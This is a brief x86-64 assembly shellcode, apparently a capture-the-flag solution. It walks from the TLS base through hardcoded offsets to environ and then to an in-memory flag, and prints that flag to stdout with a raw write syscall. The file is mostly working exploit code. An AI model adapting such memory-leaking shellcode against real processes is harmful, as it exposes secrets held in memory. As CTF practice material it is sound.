#include <sys/syscall.h>
.intel_syntax noprefix
.global _start
_start:
    # Get 'fs' base
    mov r12, fs:0

    # Diff between TLS and environ - 0x3f40
    # Get a pointer to the stack from environ
    mov r12, [r12-0x3f40]

    # On the stack, there is a pointer that points to the flag
    # (Diff between environ and the flag - 0x240)
    mov r12, [r12-0x240]

    # Write flag to 'stdout'
    # (well, we must print it somehow)
    mov rdi, 1      # STDOUT
    mov rsi, r12    # flag pointer
    mov rdx, 128    # flag length
    mov rax, __NR_write
    syscall
